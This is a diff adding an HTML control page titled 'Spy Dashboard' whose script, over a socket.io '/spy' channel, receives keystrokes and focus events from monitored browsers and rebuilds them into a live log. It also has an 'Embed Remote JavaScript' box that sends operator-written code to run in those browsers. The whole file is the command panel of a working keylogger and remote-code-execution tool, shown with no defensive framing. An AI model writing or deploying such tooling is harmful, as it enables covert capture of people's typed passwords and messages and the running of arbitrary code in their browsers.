@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Spy Dashboard</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font: 13px Helvetica, Arial;
+      }
+      h1 {
+        margin-bottom: 20px;
+      }
+      #messages {
+        list-style-type: none;
+        margin: 0;
+        padding: 0;
+        max-height: 400px;
+        overflow-y: auto;
+        border: 1px solid #ccc;
+        padding: 10px;
+      }
+      #messages li {
+        padding: 5px 10px;
+      }
+      #messages li:nth-child(odd) {
+        background: #eee;
+      }
+      textarea {
+        display: block;
+        margin-bottom: 20px;
+        width: 100%;
+        height: 200px;
+        font: 16px Consolas, Courier, monospace;
+      }
+      .col {
+        float: left;
+        width: 50%;
+        padding: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="col">
+      <h1>Sn00p Monitor Dashboard</h1>
+      <ul id="messages"></ul>
+    </div>
+    <div class="col">
+      <h1>Embed Remote JavaScript</h1>
+      <textarea
+        id="jsInput"
+        placeholder="Enter JavaScript to execute"
+      ></textarea>
+      <button id="sendJS">Run Remote JS</button>
+    </div>
+  </body>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    var messages = document.getElementById("messages"),
+      jsInput = document.getElementById("jsInput"),
+      remoteJsButton = document.getElementById("sendJS"),
+      socket = io("/spy");
+
+    function logMessage(msg) {
+      var li = document.createElement("li");
+      li.innerHTML = msg;
+      messages.appendChild(li);
+      messages.scrollTop = messages.scrollHeight; // Auto-scroll
+    }
+
+    function handleKeyInput(data) {
+      let key = data.key;
+
+      if (key === "Backspace") {
+        let lastEntry = messages.lastChild;
+        if (lastEntry) {
+          lastEntry.innerHTML = lastEntry.innerHTML.slice(0, -1);
+        }
+        return;
+      }
+
+      if (key === "Enter") {
+        logMessage("<br/>");
+        return;
+      }
+
+      if (key === " ") {
+        key = "&nbsp;";
+      }
+
+      if (messages.lastChild) {
+        messages.lastChild.innerHTML += key;
+      } else {
+        logMessage(key);
+      }
+    }
+
+    socket.on("update", function (change) {
+      if (change.type === "keypress") {
+        handleKeyInput(change);
+      } else if (change.type === "element-change") {
+        logMessage(`<b>User focused on: ${change.msg}</b>`);
+      }
+    });
+
+    remoteJsButton.onclick = function () {
+      if (jsInput.value.trim() !== "") {
+        socket.emit("remoteJs", jsInput.value);
+        jsInput.value = "";
+      }
+      return false;
+    };
+  </script>
+</html>
